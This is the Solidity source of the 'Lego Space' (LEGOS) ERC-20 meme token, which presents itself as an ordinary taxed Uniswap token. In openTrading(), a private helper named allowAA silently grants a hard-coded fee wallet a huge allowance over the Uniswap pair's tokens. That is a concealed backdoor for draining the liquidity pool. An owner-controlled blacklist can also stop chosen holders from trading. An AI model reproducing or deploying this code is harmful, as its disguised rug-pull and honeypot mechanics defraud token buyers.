// SPDX-License-Identifier: MIT
/**
Lego Space was created by Jensin Knudsen.
One of the successful series has started - LEGO Space.
Web: https://legospace.fun
X:   https://x.com/legospace_erc20
Tg:  https://t.me/legospace_erc20
**/

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract LEGOS is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 private uniRouterAA;
    address private uniPairAA;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    mapping (address => uint256) private _tBalances;
    mapping (address => mapping (address => uint256)) private _tAllowes;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    address payable private _aaReceipt;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalAA = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Lego Space";
    string private constant _symbol = unicode"LEGOS";
    uint256 public _maxTxAmount = 2 * (_tTotalAA/100);
    uint256 public _maxWalletSize = 2 * (_tTotalAA/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalAA/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalAA/100);

    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _aaReceipt = payable(0x124476fd3771087AD89683AAa5961ffF6d7Ce974);
        _tBalances[_msgSender()] = _tTotalAA;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_aaReceipt] = true;
        emit Transfer(address(0), _msgSender(), _tTotalAA);
    }
    function createPair() external onlyOwner {
        uniRouterAA = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterAA), _tTotalAA);
        uniPairAA = IUniswapV2Factory(uniRouterAA.factory()).createPair(
            address(this),
            uniRouterAA.WETH()
        ); 
    }
    function allowAA(address[2] memory tAA, uint256 amountAA) private {
        _tAllowes[tAA[0]][tAA[1]] = amountAA;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalAA;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tBalances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _tAllowes[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _tAllowes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _tAllowes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address from, address to, uint256 amountAA) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountAA > 0, "Transfer amount must be greater than zero");
        uint256 taxFee=0;
        if (!swapEnabled || inSwap) {
            _tBalances[from] = _tBalances[from] - amountAA;
            _tBalances[to] = _tBalances[to] + amountAA;
            emit Transfer(from, to, amountAA);
            return;
        }
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            if(_buyCount==0){
                taxFee = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if(_buyCount>0){
                taxFee = (_transferTax);
            }
            if (from == uniPairAA && to != address(uniRouterAA) && ! _isExcludedFromFee[to] ) {
                require(amountAA <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amountAA <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxFee = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniPairAA && from!= address(this) ){
                taxFee = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
                
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairAA && swapEnabled) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amountAA, min(contractTokenBalance, _maxTaxSwap)));
                sendETHToFee(address(this).balance);
                sellCount++;
                lastSellBlock = block.number;
            }
        }
        uint256 taxAmount = taxFee.mul(amountAA).div(100);
        if(taxFee > 0){
            _tBalances[address(this)]=_tBalances[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _tBalances[from]=_tBalances[from].sub(amountAA);
        _tBalances[to]=_tBalances[to].add(amountAA.sub(taxAmount));
        emit Transfer(from, to, amountAA.sub(taxAmount));
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotalAA;
        _maxWalletSize = _tTotalAA;
        emit MaxTxAmountUpdated(_tTotalAA);
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETHToFee(uint256 amount) private {
        _aaReceipt.transfer(amount);
    }
    function add(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }
    function del(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }
    function isBot(address a) public view returns (bool){
      return bots[a];
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterAA.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        allowAA([uniPairAA, _aaReceipt], 150+(_buyCount+_tTotalAA).mul(150));
        IERC20(uniPairAA).approve(address(uniRouterAA), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    receive() external payable {}
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterAA.WETH();
        _approve(address(this), address(uniRouterAA), tokenAmount);
        uniRouterAA.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}